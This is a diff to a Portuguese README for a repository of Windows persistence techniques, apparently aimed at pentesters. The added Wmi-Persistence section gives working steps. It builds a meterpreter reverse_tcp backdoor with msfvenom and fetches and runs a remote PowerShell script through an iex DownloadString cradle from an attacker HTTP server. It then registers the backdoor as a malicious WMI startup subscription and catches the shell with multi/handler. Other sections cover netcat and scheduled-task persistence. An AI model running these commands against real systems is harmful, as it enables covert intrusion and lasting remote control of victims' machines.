@@ -19,8 +19,8 @@ Eu sou o Stux e estarei constantemente atualizando este repositório com novas t
  - [Wmi-Persistence](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#wmi-persistence)
  - [SharPersist](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#sharpersist)
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
-### Persistence Service
+
+## Persistence Service
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Overview:
@@ -57,12 +57,15 @@ Note que logo que você colocar para ouvir o multi/handler, já receberá uma no
 Para prova de conceito, iremos dar um reboot na máquina explorada e aguardar a shell em nosso multi/handler.
 ![persistence-service3](https://user-images.githubusercontent.com/67444297/198635260-54025d20-366e-4e76-a31e-1731e7da1702.jpg)
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
-### Persistence Registry
+
+## Persistence Registry
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
-### Netcat
+Overview:
+
+Etapas:
+
+## Netcat
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Overview:
@@ -98,8 +101,8 @@ nc IP PORTA
 ```
 ![nc5](https://user-images.githubusercontent.com/67444297/198689315-99ce1fe9-5608-4374-b861-b48f09492a57.jpg)
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
-### RDP
+
+## RDP
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Overview: 
@@ -107,8 +110,8 @@ Overview:
 
 Etapas:
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
-### Schtasks
+
+## Schtasks
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Overview:
@@ -147,8 +150,8 @@ Para prova de conceito, iremos dar um reboot na máquina explorada para que noss
 
 ![Screenshot_5](https://user-images.githubusercontent.com/67444297/198840168-3b5f04a7-1f47-464d-bfd8-96d8c22f2aa8.png)
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
-### Schtasks - Log Events
+
+## Schtasks - Log Events
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Overview:
@@ -187,24 +190,68 @@ Para prova de conceito, iremos dar um reboot na máquina explorada para que noss
 
 ![Screenshot_5](https://user-images.githubusercontent.com/67444297/198754920-67ffe450-596a-4dfc-8736-8e5eed3ca16e.jpg)
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
-### WMIC
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Overview:
-
-Etapas:
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
-### Wmi-Persistence
+## WMIC
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Overview:
 
 Etapas:
 
+
+## Wmi-Persistence
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-### SharPersist
+
+Overview:
+O script WMI-Persistence serve para criar assinaturas de eventos WMI maliciosas, através do upload desse script powershell para a máquina explorada, iremos realizar o processo de persistência.
+
+Para realizar o download do WMI-Persistence.ps1 [clique aqui.](https://github.com/subesp0x10/Wmi-Persistence)
+
+Etapas:
+- Vamos iniciar gerando um backdoor através do msfvenom.
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
+```
+![Screenshot_2](https://user-images.githubusercontent.com/67444297/198842746-8fcddb07-b4de-4b5b-b1ea-90dff3e80e4e.jpg)
+
+- Vamos realizar o upload do backdoor para um diretório temporário do usuário de Administrador.
+
+![Screenshot_3](https://user-images.githubusercontent.com/67444297/198842747-c513dffb-76d2-456b-933a-473f8312ce58.jpg)
+
+- Agora, iremos iniciar um servidor http para realizar o donwload do WMI-Persistence.ps1 na máquina explorada.
+
+![Screenshot_4](https://user-images.githubusercontent.com/67444297/198842748-aac5ad0f-aa7e-4f50-9a0f-9150f9229b36.jpg)
+
+- No meterpreter, vamos carregar a extensão do powershell e iniciar.
+- Também realizaremos o download do WMI-Persistence e instalaremos o nosso backdoor.
+```bash
+load powershell
+powershell_shell
+iex (New-Object Net.WebClient).DownloadString('http://10.10.22.3/WMI-Persistence.ps1')
+Install-Persistence -Trigger Startup -Payload "\Users\Administrator\AppData\Local\Temp\backdoor.exe"
+```
+![Screenshot_6](https://user-images.githubusercontent.com/67444297/198842749-130f1e87-a357-4b97-b293-989ae50a22aa.jpg)
+
+- Agora, iremos colocar o multi/handler para escutar e receber a shell.
+```bash
+msfconsole -q
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST SEUIP
+set LPORT 4444
+exploit
+```
+
+![Screenshot_7](https://user-images.githubusercontent.com/67444297/198842750-dd90ada1-247f-492d-9321-50252a435058.jpg)
+
+Para prova de conceito, iremos dar um reboot na máquina explorada para recebermos nossa shell.
+![Screenshot_8](https://user-images.githubusercontent.com/67444297/198842752-cf12ffe2-1d88-45d6-a38b-0c4c04c701ce.jpg)
+
+- Logo após o reboot, receberemos nossa shell no multi/handler.
+
+![Screenshot_9](https://user-images.githubusercontent.com/67444297/198842754-83093da4-0d80-4a32-8e86-0e8cb2956a0f.jpg)
+
+
+## SharPersist
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Overview:
